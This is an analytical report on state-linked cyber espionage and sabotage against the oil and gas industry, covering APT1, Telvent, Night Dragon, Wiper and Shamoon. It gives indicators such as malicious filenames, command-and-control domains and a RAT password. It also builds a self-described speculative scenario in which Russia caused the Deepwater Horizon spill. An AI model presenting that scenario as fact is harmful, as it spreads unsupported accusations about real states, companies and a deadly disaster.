This is then a convergence of time and objectives across these operations which complement the tactical similarities involving the use of social engineering , persistent backdoors , and large scale data exfiltration .
In September 2012 Canadian energy company Telvent was infiltrated .
Telvent is responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America .
The attackers installed malware which they used to steal project files related to Telvent 's OASyS SCADA product .
According to security blogger Brian Krebbs , OASyS is `` a product that helps energy firms mesh older IT assets with more advanced ' smart grid ' technologies .
Not only was the malware difficult to detect , but it was planted using spear - phishing methods that targeted mid to high level executives .
Perhaps the most convincing piece of evidence as to the origins of the attack is what appears to be a notification released by Telvent which identified malicious files and domains used for Command and Control ( C2 ) .
The filenames `` fxsst.dll '' and `` ntshrui.dll '' which appear in the Telvent notification also appear in the APT1 report , along with the domains `` hugesoft.org '' and `` bigish.net '' which are noted as mainstays of APT1 by Mandiant .
Several security firms at the time also reported the belief that the attack had been perpetrated by the `` comment group '' an alias in the Mandiant Report for APT1 .
In fact , Mandiant actually mentioned the Telvent attack in their report under a section entitled `` APT1 in the News .
Although available information indicates that the goal of the attack was stealing software , the software could just have easily been modified and replaced .
Attacking a prolific energy ICS company like Telvent means that a trojan could be planted in the software , being unintentionally distributed to Telvent 's customers and offering the perpetrator an avenue for more insidious attacks .
Perhaps the most readily apparent attribution is to China as a state actor – the APT1 report makes a convincing argument for this which offers a lot of very well constructed circumstantial evidence .
Night Dragon highlights the use of a RAT known as zwSheel which was used both as a to perform C2 and to create custom trojans .
Interestingly , upon launch zwShell displays an error dialog with a hidden text field and the program will not function unless the password ' zw.china ' is entered into this hidden text field .
The ranges of consecutive IP addresses used were large enough that it is likely that the Chinese government had to be involved in some capacity .
China certainly possesses the motive to commit the attacks – according to the Washington Times , China is already surpassing the United States as the number one oil importer from the Middle East , and poised to become the number one oil importer globally .
Chinese demand for oil has grown dramatically as its economy continues to expand .
Since the mid-1990s , China has been a net importer of oil .
The continuous growth of the Chinese economy has resulted in vast increases in the need for fuel and petro products .
China has doubled its oil consumption in the last 10 years and become the second largest consumer of oil in the world behind the U.S. Like the U.S. , China is now dependent on its oil imports to feed its thriving economy .
It is estimated that China 's import dependency could rise to over 50 % by 2020 .
China 's oil refineries are not capable of handling the current demand the economy is placing on them .
There is evidence that the refineries used for fuel are at a competitive disadvantage when compared to other countries .
To complicate matters , many Chinese oil refineries are also oriented to the making of diesel and not gasoline , which is in increasing demand .
This means China is in great need of more sources of oil and more efficient refineries .
The development of improved refining and mining equipment takes years and can cost millions of dollars .
Exploration costs for finding new oil reserves have almost tripled in the past decade .
They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process .
It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own .
This establishes that there are significant reasons for China to act on behalf of its own oil industry and use its state resources to conduct cyber - attacks against corporate entities worldwide .
As seen in the chart above , China experienced a significant increase in oil production during 2009 .
This spike in production could be due to information that China gained from US firms through cyber espionage actions , such as Night Dragon .
The Night Dragon attacks were believed to have begun circa 2007 .
According to Kirk , information taken during these attacks includes market intelligence reports and information on operational production systems .
Similarly , the Mandiant report shows that the APT1 group has monitored Mandiant 's energy industry customers from approximately the beginning of 2009 to 2012 .
During these attacks , APT1 would export terabytes of data from the victims to China .
In tandem with these revelations , China 's also aggressively pursued oil supply contracts during 2009 .
During this time major Chinese state oil companies acquired holdings in 18 different countries .
China is determined to take on oil and gas infrastructure development and to acquire oil industry assets .
Although there is evidence that China has been conducting cyber espionage activities against oil industry targets as far back as 2007 , there is only trivial growth until 2009 .
This could be a result of the time and recourse commitment required to process the data that was acquired .
As mentioned , both the Night Dragon and APT1 attacks stole an enormous amount of data from English speaking companies .
It is necessary for English - fluent operators to sift through this data and extract actionable information to report .
This information would also need to be provided to experts in the field who could recognize the its vale , and that process would have to be done discreetly so as not to arouse suspicions .
This would take time .
The Mandiant report comments on the fact that there are limited English - fluent operators directly involved in the technical end of APT1 , which would significantly hinder progress .
Considering these factors and the timeframe for growth presented above , it is conceivable that the information and strategy for its use would not be available until 2009 .
At this point , China could act to increase the output of the holdings that they currently owned .
Also , the information gained from market intelligence reports and possibly exploration reports could guide the state companies in deciding which new holdings to purchase during this time period .
The new holdings would allow for increased output overall .
China 's fervor for oil acquisition has not been limited to aggressive increases in holdings and contracts .
These activities are likely only one piece of a global strategy to secure China 's future oil requirements , including reserves that may not be productive today or in the immediate future .
This overarching strategy has apparently led to a pattern of quiet investment , which may be a direct cause for concern in America .
An article appearing in the Associated Press discusses these Chinese investments in Venezuela , the country with the largest proven oil reserves as of 2011 , and throughout the Caribbean and South America .
The article notes that `` when Venezuela seized billions of dollars in assets from Exxon Mobil and other foreign companies , Chinese state banks and investors did n't blink .
Over the past five years they have loaned Venezuela more than $ 35 billion .
In some cases it appears that the Chinese are making loans that the countries will likely be incapable of repaying , placing them squarely within China 's control .
Many of the deals included `` repayment in oil and natural gas '' and billions of dollars have been loaned directly to energy companies in Russia and Turkmenistan , both of which have been targeted in cyber espionage campaigns and are in the top 5 for proven natural gas reserves .
Although the IEA has predicted that America is moving towards energy independence and is poised to become the number one oil exporter by 2017 , the loans are breeding closeness with and reliance on China by countries in close proximity to the US .
This could allow for the Chinese to weaken American influence in the region and create agitation against the US or between other countries within the region in order to distract the US from its goals in other areas strategic to the Chinese .
These deals also place China in the supply chain for borrowers ' projects where China has insisted on Chinese companies being involved as a stipulation of the loan .
These loans have not required any economic reforms to accompany them , meaning that countries which could not secure a loan from the IMF due to poor financial decisions may continue to flounder in spite of aid , perhaps even more so because of it .
In the worst case scenario , these countries become unstable .
While this may cause issues to the Chinese in some logistical capacities , it would also serve to divert some of America 's attention , making the situation a palatable outcome for China .
An analysis of these events would be remiss without exploring any other possible attribution .
Though unlikely , it is possible that there were other actors involved .
As pointed out by Eugene Kaspersky in his criticism of the Shady RAT report , some of the tools and techniques are generic enough to not lend themselves to attribution to a particular entity .
Even the ones that are of Chinese origin do not of themselves implicate the Chinese government , only an actor familiar with how the tool works or minimally trained in Mandarin .
A large portion of these tools were freely available on underground Chinese hacking sites .
Chinese hacking collectives or corporations may have been independently involved .
However , due to the suspicions voiced in the leaked diplomatic cables suggesting PLA involvement and Mandiant 's research on the topic indicating the same , it is highly unlikely that the Chinese government was not involved whatsoever .
These sources , and the timeframe in which the attacks occurred -- between roughly 9 am and 5 pm consistently over a protracted period of time -- is indicative of a formalization of the activity .
This is further evidenced by the resources required to carry out the attack and the Chinese government 's grasps on censorship of their citizens through technical controls .
Terabytes of data infiltrating the country is unlikely to have been missed , particularly over the course of a decade of activity .
If China had been involved in any capacity in cyber espionage attacks and this had been discovered by another entity , said entity might have leveraged this knowledge to collude with them either through coercion , cooperation , or clandestinely without the Chinese government knowing .
Though this may seem farfetched , a report released by a Luxemburg security firm details how , in the wake of Mandiant 's APT1 report , they decided to engage in an intelligence gathering operation on the APT groups operating out of China .
By scanning Chinese IP ranges for C2 servers known to be used in the APT1 attacks and exploiting weaknesses in the attackers ' C2 infrastructure , they were able to access , monitor , and control the APT infrastructure without the adversary 's knowledge .
Bloomberg also hinted at the possibility of American security firms acting in a similar way when they `` exploit [ ed ] a hole in the hackers ' security … logging the intruders ' every move as they crept into networks ...
This is truly a stretch of the imagination , and there is no evidence whatsoever to support this theory .
The most likely case for any attribution involves the Chinese government in some capacity .
The most important takeaway from these incidents is the significance they hold to the future of the Oil & Gas industry .
Inexorably , Oil and Gas is intertwined with the Cyber domain , and will only continue to become more so as the time progresses .
The increased reliance on technology means that more and more data and control will be accessible to the attackers in the future .
A large contingent of the attacks relied on social engineering and spear phishing as a point of entry , though there is a shift toward `` watering hole '' attacks .
This is significant because even as technical controls get better , unwitting employees and their behavior will continue to be a focal point in targeted attacks .
Automation via SCADA / ICS has been an integral part of the Oil industry 's past and will be even more so in the future .
Attacks like the Telvent attack herald an insidious turn of events for SCADA within Oil & Gas .
The attackers seemed intent on stealing SCADA software , but it is conceivable that they could have taken such an opportunity to embed their own code within it , providing a capability to manipulate large swaths of North American pipeline at will .
This is not meant to be alarmist , but rather considers the next evolution of attack .
Leveraging malicious SCADA software to achieve a kinetic outcome is not the baseline going forward , but it is well within the realm of possibility .
The nature of a capability like this means that it can only be leveraged to catastrophic effect once , so the possibility of an entity using it outside of sustained or ardent conflict is low .
However using this on a micro - scale , and degrading service or quality of service through manipulation of malicious software on the PLCs or HMIs could be more viable in a peacetime setting , and less noticeable .
This type of activity could be used at the height of negotiations or disputes to put an adversary in a compromising position , or simply distract them .
The Cyber - warfare doctrine of large nation - states like China and Russia that have a huge stake in the Oil & Gas Industries is one of perpetual conflict .
Timothy Thomas discusses this in his books Recasting the Red Star and The Dragon 's Quantum Leap .
The idea of an `` active defense '' and keeping potential competitors `` off balance '' is the posture going forward .
The concept of peace being a time without conflict is rapidly disappearing .
As globalization has become the status quo and global economies become ever more entangled , threat of a large - scale kinetic confrontation between top tier economic powerhouses is nearly strategically unviable .
Instead , both state and non - state actors will use constant conflict in the Cyber realm as a method for accruing resources and exercising control .
While cyber conflict often brings to mind the idea of SCADA initiated pipeline explosions , the theft of intellectual property and business communications is far more likely to continue .
This type of low intensity conflict is cost - effective and politically sustainable in an environment where direct attribution is at times difficult .
The idea of a constant or long term `` ally '' or `` strategic partner '' is no longer valid – coordination will be largely issue specific , and only to the extent required to achieve an end .
While coordinating on one topic nations will be in conflict on another .
This is not in any way a revolutionary or new idea ; however it is becoming more and more relevant to salient industries operating within their own nation state and abroad as they become far more accessible and targetable in this type of conflict .
Non - state actors will play a huge role in future cyber conflict within the oil and gas industry .
The Norway attack which coincided with a meeting by a state - backed Oil & Gas company may suggest that they already are playing a role .
Certainly Antivirus & Incident Response companies are playing a role as non - state actors by releasing these reports .
But aside from cooperation with Sate actors , non - state actors may operate independently against other non - state actors in pursuit of competitive advantage or sabotage .
Hacker collectives like anonymous could have an out - sized impact if more highly organized , and the attacks they have already carried out could become more severe – instead of simply releasing email addresses , they could release bid data , or attempt something more destructive akin to a Shamoon type attack .
The release of reports on APT is in a way its own form of cyber conflict ; the rhetoric of these reports is an information influence operation , both targeted at potential customers and at adversaries .
These reports also allow adversaries to see how they were detected and correct mistakes going forward .
It is likely that future attacks will lack the types of unprofessional mistakes made during these campaigns .
The embedding of personal signatures ( a la Ugly Gorilla ) or the use of passwords like `` zw.china '' will diminish significantly .
If an attacker wished to be more anonymous , it would start to transition to open - source and generic tools exclusively – tools which are common enough that they do not provide significant attribution .
Tools like the Metasploit framework provide a high degree of extensibility without offering a significant amount in the way of attribution by tool choice .
If not a transition like this , then using tools stolen from other attackers or written in other languages would complicate attribution .
The move within the Information Technology world toward more forensically resistant technologies such as SSDs and Cloud Service infrastructures which make attribution and legal jurisdiction much more convoluted will continue to be a catalyst for future attacks alongside services already in use like Dynamic DNS .
These cyber espionage attacks are likely the newly established baseline for future cyber conflict within the Oil & Gas Industry .
Attacks of this nature and magnitude will continue to originate from places which do not have laws against it or are complicit , including China which has a need to secure oil dominance in the future .
However , increasing international pressure will necessitate more covert action , with attackers dispersing their operators or proxies throughout large geographic areas .
Non - state actors will likely present APT threats in the future , including State - backed and independent competitors .
Another series of events may be connected as well , and while they bear no immediately apparent relationship , closer inspection is suggestive of the possibility of another underlying and ongoing conflict .
To understand the context of the exchange , a non - oil - related cyber event must be briefly discussed .
A relatively unprecedented cyber - attack came to light in 2010 when the Stuxnet virus hit the uranium enrichment centrifuges in Iran .
Iran believes the attack was conducted by Israel or the United States .
This attack had targeted the information networks of offshore platforms ; however they reported that they were able to defend against the attack .
Iran may have thought it was Israel because they had threatened to take military action if the sanctions on Tehran 's banking and oil sectors did not stop Iran from continuing their nuclear program .
The attacks targeted Iran 's infrastructure and communications companies , which slowed the Internet in Iran .
Israel and the United States have denied being a part of this attack .
Then In April of 2012 , Iran was again the target of a cyber - attack .
The Islamic republic reported that a computer virus was detected inside the control systems of Kharg Island , which controls Iran 's crude oil exports .
This virus began to attack several of the main Persian Gulf oil terminals in Iran , which forced the Iranian officials to disconnect them from the Internet to avoid spreading the virus .
This virus , known as Wiper , successfully erased information from hard disks at the Oil Ministry 's headquarters in Tehran .
The headquarters had apparently been the initial target of the virus .
Oil Ministry officials reported that the international selling division had not been infected , but it many security vulnerabilities were exposed .
Iran is one of the world 's largest oil producers and an attack could affect the market , and raise oil prices globally .
As with the Stuxnet worm , Iran blamed Israel and the United States for the spread of Wiper .
Iranian officials believe they were targeted because of their growing nuclear program .
Other affected organizations include the National Iranian Oil Processing and Distribution Company , National Iranian Gas Company , Iranian Offshore Oil Company , Pars Oil and Gas , and other companies controlled by the National Iranian Oil Company .
The destruction of this data does n't provide much in the way of direct monetary gain for any criminal elements .
The real advantage gained by unleashing Wiper is to put pressure on Iran by causing economic loss and reminding them that they are vulnerable .
The president of the Tehran World Trade Center , Mohammad Reza Sabzalipour , believes the cyber - attack was indeed a direct message .
The aim was to increase pressure so that Iran will compromise in the upcoming nuclear talks on May 23 , 2012 .
He later states , `` We are in a bloodless war .
If the talks fail , Iran can expect much more of this '' .
An oil embargo in concert with other economic sanctions by the United States and EU was announced in late 2011 in an effort to discourage any further Iranian nuclear activity .
In March of 2012 , the Obama administration announced that the market could withstand the embargo of Iranian oil , and raised US - Iran tensions over the issue .
Saudi Arabia had also indicated that it would boost oil exports to the US and abroad to compensate for the void that would be left by the sanctions on Iran .
As the fifth largest oil producer in the world , the Iranian oil industry accounts for about 20 percent of Iran 's GDP .
Both the embargo and the virus represent serious and direct concerns for the Iranian government .
Then in August of 2012 , only four months after the embargo , a virus named Shamoon struck Saudi Arabian oil giant Aramco .
The virus was triggered on a Muslim holiday when most of the company 's employees were absent from work .
Shamoon was designed to replace data on hard drives with a picture of a burning American flag and report the address of the computer back to a separate computer inside the company network .
This is potentially significant because Aramco is the world 's largest producer of oil , and was originally a joint effort with the United States ( Arabian American Oil Company ) .
The name `` Wiper '' and the shared functionality of the two are somewhat suggestive .
Interestingly , a previously unheard of `` hacktivist '' group identifying themselves as `` The Cutting Sword of Justice '' took credit for the attack and not a nation state .
They claim the virus has given them access to documents on Aramco 's computers , but none have been published yet .
The attack was believed to have been assisted by an insider at the company .
Another note of significance about Shamoon is that the text `` Arabian Gulf '' was found in the code which is pertinent because Iran has zealously guarded the title of the region as the `` Persian Gulf .
Both viruses have been analyzed by Kaspersky Labs who has concluded that although Shamoon contains a wiper function that is designed to overwrite data , it is not as well - designed as Wiper and not near as efficient .
The care that was taken by whoever made Wiper to insure it did as much damage as possible in the shortest amount of time is what differentiates it from Shamoon 's wiping feature .
Since wiping a disk with hundreds of gigabytes of storage can take an extremely long time , Wiper was designed to target files with certain extensions or in certain folders to do as much irreparable damage as fast as possible .
Kaspersky claims that Shamoon was merely a copycat virus that was `` the work of script kiddies inspired by the story .
Even though Shamoon was not on the same level as Wiper , it is still an impressive piece of malware that was able to do damage to important systems .
Whether it was the unimpressive work of a nation - state or the work of a skilled group of non - state actors , it made an impact and had an effect on Saudi Aramco .
These insights raise the question of whether or not this was an isolated attack by a non - state actor , or whether it was one in an ongoing series of salvos between the Iran and US cyber communities .
Iran certainly possessed the motive – retribution for sanctions levied against it , and the cooperation by Saudi Arabia , a Sunni Muslim nation which has been at odds with Shiite Iran before .
Typically , however , in an act of retribution the attacker invites attribution which Iran did not .
Also , despite causing destructive action to the data on the computers , the virus did not attack the actual control systems and as a result did not manage to damage oil production .
The relative crudeness of the code and use of the term `` Arabian Gulf '' in concert with the insider knowledge of the hacktivist group `` The Cutting Sword of Justice '' and the use of an Aramco insider to facilitate the attack could suggest that it was simply a singular attack by a non - state actor .
Iran 's doctrine is one of asymmetric and proxy warfare .
It has been suggested that Iran used unofficial hacker groups such as the `` Iranian Cyber Army '' to both defend against and engage in attacks .
It is possible that `` Arabian Gulf '' was a red herring intended to further obscure the origin of Shamoon .
Using a proxy to launch an attack aligns with Iran 's strategic culture but the exact author is not known .
It is possible that Iran did not wish to engage in direct conflict , but intended to make the sanctions less viable by ensuring Aramco would be unable to supply the necessary volume of oil .
If this were the case then the attack would show a severe flaw in Iran 's understanding of the oil production systems by not attacking the control systems , instead , which should be unlikely due to Iran 's own expertise in oil production ; or it may have been intended to send a message advertising the capability while not crossing a direct line by inflicting significant infrastructure damage .
This , however , is pure speculation and not empirically derived analysis .
If Iran did in fact orchestrate the Shamoon attack , it would suggest that the series of attacks on Iranian critical infrastructure were followed by retaliation on the American oil supply chain .
This would indicate an ongoing and escalating conflict that should be cause for concern .
One incident which appears on the list is singular in that unlike the other noted events it does not appear to be the result of a direct cyber - attack : the Deepwater Horizon oil spill .
On April 20th , the culmination of severe neglect of safety protocols and a slew of design and implementation flaws incurred the worst environmental disaster in US history .
While drilling the Macondo well in the Gulf of Mexico , the Deepwater Horizon oil rig had a `` blowout '' in which an uncontrolled mixture of mud and gas was released after failure of pressure control systems .
The gas spread across the rig and is believed to have first ignited in the engine room , initiating several explosions and causing the rig to eventually be engulfed in flames and sink .
The reason the `` Deepwater Horizon '' event appears on a list of `` cyber - related oil industry events '' is because , regardless of the cause , the incident had several failures in networked control and safety systems which could have prevented the catastrophe from occurring after the blowout .
The former chief electronics technician on the rig , Michael Williams , noted during testimony before a government panel that the alarms which would notify the crew of a gas situation was placed in an `` inhibited '' mode for over a year because `` they did not want people woke up at 3 o'clock in the morning due to false alarms [ sic ] .
These control issues solidify the idea that there was a cyber - component to the catastrophe .
When taken into the context of other events which occur in and around the same time period , it becomes clear that though there is no direct evidence pointing to a malign threat actor 's involvement , such an attack is technically viable .
It is incredibly unlikely that any state or non - state actor was involved in an attack on the Deepwater Horizon ; however the circumstances preclude the exclusion of this possibility , remote though it may be .
The Blowout Preventer ( BOP ) was recovered and forensically examined , but most other evidence can not be examined – it has either ceased to exist or is inaccessible .
The destructive nature of the accident and the apparent corporate neglect makes collecting any cyber - forensic evidence linking the incident to an actor infeasible .
Most evidence is destroyed , unusable , or largely inaccessible at the bottom of the ocean .
It is likely that any control system audit reports or logs capable of providing insight either would not have attributed anomalous activity to an unidentified APT , or would not be comprehensive enough to provide evidence that could retroactively suggest an APT .
The audit logs themselves are dubious due to allegations that Transocean and BP were hastily rushing procedures because of large scheduling overruns .
Further allegations have surfaced against BP employees and contractors accusing them of destroying evidence in the wake of the disaster .
Bearing in mind that there is no direct or forensically sound evidence and that only circumstantial evidence is available , the vignette which will now be explored is the use case of the Deepwater Horizon incident as a cyber - attack .
Several events that have occurred both before and since the BP oil spill suggest that an attack would be technically feasible .
According to an article attributed to Dorothy E. Denning , a professor of computer science at Georgetown University , in 1992 a disgruntled former employee of Chevron intentionally disabled alarm systems at Chevron 's oil refineries for 10 hours by `` hacking into computers in New York and San José , California .
Mario Azar , a disgruntled contractor formerly working for Pacific Energy Resources , sabotaged an offshore oil rig `` computer system that PER used to communicate between its offices and its oil platforms .
The computer system also served a ' leak detection ' function for PER .
And as recently as February 23rd 2013 an article in the Huston Chronicle stated that `` Malicious software unintentionally downloaded by offshore oil workers has incapacitated computer networks on some rigs and platforms , exposing gaps in security that could pose serious risks to people and the environment .
Complicated control system attacks such as Stuxnet have already proven that even in conditions where network access is unavailable , intelligent viruses can still perform a predetermined function at a designated time .
By extension of these occurances , it may be concluded that a capable attacker could manipulate safety control systems of an oil rig from shore , and do so through a sophisticated control system virus which can operate even when not in contact with a C2 server .
If it is assumed that Deepwater Horizon was an attack , it gives rise to the question of attribution .
In order to attribute an attack for which there is no direct or forensic evidence , one must instead turn to political attribution .
This includes considering which actors had the motive , means , and the opportunity to perform the attack .
Motives can in part be divined through observation of the direct and indirect outcomes of the event and its beneficiaries .
After narrowing the scope of actors , one may then examine the policies , strategic culture , operations , and tactics of relevant actors against different dimensions of the event to reveal alignment or correlation .
Immediate and direct impacts of the Deepwater Horizon oil spill were as follows : - A moratorium on any drilling in the Gulf of Mexico for the ensuing 6 months - The Macondo well becoming unusable , at least in the immediate - Ecological disaster in the United States and other GoM adjacent countries - Heavy political damage , fines , and charges levied against both BP and contractors such as Transocean , Ltd. BP has been by far the biggest figure attached to the incident .
As of March 2013 BP has been forced to spend or provision $ 40 Billion as a result of Deepwater Horizon .
To put this in perspective , BP 's combined profits for the years of 2010 - 2012 amount to about $ 34.6 billion .
These impacts in and of themselves are notable , but they also created a ripple effect of indirect consequences as well .
These indirect outcomes include the possible fluctuation in oil and gas prices and potential for geopolitical fallout from the ecological disaster .
Additionally though , and perhaps most significantly , in 2011 BP announced a $ 38 billion asset divestment program in order to cover the costs of the enormous fines incurred by the Deepwater Horizon spill .
So what did BP divest , and to whom ? This data would suggest that one of the main beneficiaries of the oil spill is Rosneft , a state - owned oil company belonging to a state actor which possesses both a cyber - capability and vested interest in the oil industry .
It is the only one of the top five oil producing countries yet to be mentioned : the Russian Federation .
In July of 2012 Forbes released an article on the World 's largest oil companies .
What was notable about the article was this quote : `` But when sorting through the rankings of the World 's 25 Biggest Oil Companies and looking at who controls and influences the biggest of big oil one thing becomes clear : no industry leader has more sway , has twisted more arms or made more deals than Russian President Vladimir Putin .
Russia , an acknowledged force in cyber and the second largest exporter of oil in the world , is markedly absent in the last decade from the master timeline either as an aggressor or as a target , barring of a few leaked emails by the Anonymous hacking group .
This appears aberrant , even despite the possible language barrier mentioned at the beginning of this report or Russia 's tightly controlled dissemination of information .
While clearly the Russian Federation was the largest beneficiary of BP 's post - spill divestments and also benefited from a halt in Gulf of Mexico oil production , the question that remains is whether or not the possible acquisition of TNK - BP ( which would be difficult to predict ) is motivation enough to engage in a risky enterprise such as a cyber - attack that results in a kinetic outcome - particularly when weighed against the possibility of direct attribution that could have far reaching implications to relations with both the UK and the US .
If these benefits alone are not enough , then what other motivators existed which , in concert , would have been cause for Russia to launch a cyber - attack on a UK company operating in the Gulf of Mexico ? In order to properly answer these questions many factors need to be examined , including : - the extent of BP - Russian relations leading up to and beyond the Deepwater Horizon incident - Geopolitical considerations of the time - Any competition in market - share between BP and Russian state - controlled oil companies - Russia 's overall relation to and dependence on the oil industry - Russia 's strategic goals at the time - A high - level understanding of the Russian approach to cyber warfare An interesting relationship between Russia and BP has unfolded over the past decade , revealing a series of exchanges that highlight a tenuous co - existence .
The figure below displays this in detail , aligned with geopolitical events .
The exchange begins in 2006 when the Russian state - run gas company Rosneft went public on the London stock exchange and BP purchased 1 billion in shares .
This is a seemingly straightforward strategic partnering ; however there was speculation that BP was `` pressured into investing in order to secure future oil exploration rights for its own Russian joint TNK - BP .
This came on the heels of speculation that Russia wished to `` buy out the shareholders of TNK - BP as part of its campaign to tighten control of the country 's energy assets .
Also in 2008 , an important BP incident which did not appear to directly involve Russia occurred .
Off the coast of Azerbaijan at the Central Azeri platform in the Caspian Sea , one of BP 's off - shore rigs suffered a blowout nearly identical to that of the Deepwater Horizon .
The gas did not ignite , and no one was killed , however it did cost around $ 50 Million a day in losses for the Azeri government .
Then the Deepwater Horizon event occurs in 2010 , followed by the sale of TNK - BP to Russian state - run Rosneft in 2012 as part of the asset divestment program initiated to pay for the spill .
In that deal , BP also purchased shares in Rosneft , upping their stake from 1.25 % to 20 % and receiving two seats on the board of directors , including one which was awarded to BP 's current CEO Robert Dudley - the same gentleman who was forced to flee in 2008 over an un - renewed visa .
However , according to a Reuter 's article published on March 4th of this year `` … as a state appointee , Dudley would have to vote by government directive on major issues , such as large deals and key appointments .
Following the collapse of the Soviet Union in 1991 , many of the state owned oil and gas assets were sold at significantly discounted values to private individuals creating an economic void for a fragile new country already plagued by monetary issues in other sectors .
Russia faltered economically for most of the 1990 's until Vladimir Putin was elected President in 2000 under a banner of planned economic prosperity .
Putin is an interesting figure , and has played prominently in Russia 's return to the world stage .
A former KGB member , Putin has sought the consolidation and reclaim of critical sectors of the Russian economy , most notably the energy sector .
Using strong - arm tactics and political pressure , he has set the tone for Russia 's future policy .
In 2006 , Russia temporarily turned off the gas it was supplying to the Ukraine , inciting conflict and unrest with other European countries .
The move was cast as an overt attempt to regulate natural resource prices for a market in which Russia controls production and reaps profits from a customer base with limited alternate supply .
Russia used the tactic again in 2009 , shutting off gas supplies for two weeks to Ukrainian Naftogaz ostensibly because of a dispute over contract terms which had been negotiated in 2002 regarding the appropriation of gas by Naftogas .
The ordeal was only resolved after Ukraine 's Prime Minister sat down with Vladimir Putin and renegotiated a new contract for Russian gas , for which she later received a 7 year sentence on charges of abuse of power .
These events serve to highlight the importance Russia places on the energy sector as both a vital portion of its economy and a potent political tool .
The Russian economy is heavily dependent on the oil & gas industries , with 62.7 % of its economy being service based industries in 2010 .
Many economists have pointed to oil and gas prices as the Achilles heel of the Russian economy .
This was made evident in 2008 when oil prices plummeted ( as seen in the figure below ) , sending the Russian economy spiraling into a recession .
Prices hit a low in 2009 , one year before Deepwater Horizon and at a time when reports were also stating that the overall output of Russian oil for 2010 was projected to decline .
This stagnation in the economy combined with future projections of slowed oil production presented a huge threat to Russia , and it is likely that this sentiment resonated with Russian authorities .
As pointed out by a Forbes columnist , a sustained drop in oil prices like that in 2008 would mean possible civil unrest and political instability – oil and gas have that magnitude of effect .
This resonance may perhaps be seen in the Russian National Security Strategy to 2020 published in May of 2009 .
The document outlines a path for Russia to continue to regain prominent global power , and within it there are several points which lend credence to a strategic view of oil and gas resources .
The document states that `` the longer - term focus of international politics will concentrate on the possession of energy resources , notably in the Middle East , on the Barents Sea shelf and other areas of the Arctic , in the Caspian Sea Basin , and in Central Asia .
What follows is a purely speculative narrative of one possible attack scenario , intended to highlight elements of Russian doctrine which align with aspects of the BP oil spill .
It will also include techniques and tools which provide functionality that makes such an attack feasible .
So it is possible that after the oil price crash in 2008 , Russian officials saw the danger to social and political stability in the country .
Forecasts for Russian oil output around 2009 also suggested that not only were prices dropping , but overall production would as well , envisaging the specter of future unrest and hardship .
Realizing the strategic importance of oil and the success they had garnered with previous market halts , they needed a way to either artificially inflate oil prices , increase demand for Russian oil , or increase oil output .
It is worth noting that price of natural gas ( another huge component of the Russian economy ) is inextricably linked to oil prices in most of Europe during this period because gas is price - indexed against oil .
Unlike the natural gas incidents where Russia was able to use state - controlled Gazprom to halt gas leaving the country , a sizeable portion of the oil leaving the country was from privatized companies .
It would be difficult to overtly prevent them from exporting without significant backlash from international communities ( such as the World Trade Organization where they had been seeking entry for some time ) , so action would need to be more covert .
One of the largest of these private oil firms was TNK - BP , which Russian authorities had already attempted to strong - arm into government control as they had done with other smaller oil companies like Yukos .
The other main exporter of oil to Western Europe at this time was BP plc , the 50 % owner of TNK - BP .
Therefore , control of TNK - BP would both increase oil revenues and state - output , and simultaneously decrease a prime competitor 's overall output .
It would also give them a larger political weapon that could be used as a bargaining chip or to meet the aforementioned goal of price control .
However , BP had proven recalcitrant and defiant about relinquishing TNK - BP in spite of the pressures which had already been applied .
A past rocky relationship with BP combined with their recent safety failures and cover - up in the Caspian Sea also made them a viable target .
If they could not be motivated by conventional means , then Russia would have to revert to force as pointed out earlier in their National Security Strategy to 2020 ( `` the competitive search for resources does not exclude the use of force '' ) .
Sabotage could be a viable option , however it would have to be on a large enough scale that BP would be put into a position where they would fold to Russian interests under the additional pressure .
While an on - shore explosion would cause some delays in production and potential loss of life leading to litigation , off - shore destruction would have the potential to be significantly more damaging publicly , could also include loss of life , and would incur significant environmental fines in addition to safety fines .
The question would then be where to strike – BP holdings in the Caspian Sea would be too dangerous as any failures could easily implicate Russia and any success could cause collateral damage to Russian oil assets and coastal regions .
The North Sea would be a potentially viable candidate with multiple countries being affected resulting in more economic impact on BP , however the currents are such that collateral damage could occur to other areas that Russia identified as vital fields of competition , namely the Barents Sea .
Russia has long seen ( and continues to see ) American power as a dangerous counter to its own , marking the US as its top global competitor .
The GoM then would prove very attractive as it offered a two - fold bonus .
A cash - strapped United States , riddled by its own recession , would bear the brunt of the collateral damage resulting in heavy fines to BP , perhaps made heavier because of the state of the American economy .
Secondly , BP would possibly lose its asset ( s ) and right to drill offshore in the GoM , a region BP considered strategic .
It would allow for an information influence operation on the American public – poisoning the market against BP , but also potentially against the American government if they repeated any mistakes in their handling of an incident like the 2005 Hurricane Katrina rescue and relief effort .
America in 2008 and 2009 was already facing internal contention over deep water drilling practices , meaning that a significant event in the region could perhaps halt production by governmental directive .
Even with the contention , BP had already made history in the Gulf ; in mid-2009 the Deepwater Horizon rig finished drilling the deepest oil well in history in the Tiber Oil Field off the coast of Texas .
This meant that one of the top competitors for Russian oil exports was making headway in this region .
America is also the largest importer of oil , so even though oil prices are a complicated affair that takes into account aspects like the economic stability of different regions and future projections of demand , any damaging effects on American production or supply could potentially increase oil prices .
In March of 2009 , drilling of a new well , Macondo , was approved and scheduled to begin later that year , creating an ideal target .
Realistically , in a clandestine project of such importance it is likely that Russia would have identified several GoM targets , perhaps alongside BP North Sea assets as well .
Having the Gulf of Mexico in mind , Russia now needed a method for delivery .
Analyzing the 2008 incident in the Caspian Sea which was still fresh at this time , it may have been noted that one of the root causes of the blowout was a flaw in the concrete - concrete possibly provided by the same US contractor who worked for BP in the GoM : Halliburton .
They may have also surmised that if the alarms and safety systems had not activated in the Caspian Sea incident , the crew may not have been capable of reacting quickly enough to prevent an explosion , thus creating a terrible ecological disaster and causing loss of life .
So , a workable option appeared to be a covert cyber - attack on rigs operating in the gulf which disabled safety measures or created a situation where a blowout would occur .
If done correctly , they could easily hide any attribution behind China ( who had been actively stealing secrets from oil companies at this time ) , a non - state hacking group , a sporadic virus , or merely a glitch / accident .
Because of the high stakes involved in any attribution to Russia , the best option would be making it purely appear to be an accident or neglect by BP and its contractors .
This could be achieved by playing on known patterns and behaviors by BP that were risky .
The type of intelligence Russia would have been intimately familiar with through their own dealings with BP and analysis of other BP safety incident in the recent past .
This blends seamlessly with the Russian concept of `` Reflexive Control .
Russian hackers such as the GLEG group have demonstrated proficiency in finding exploits in ICS software by releasing the Agora SCADA+ exploit kit which had a plethora of zero - day exploits in it .
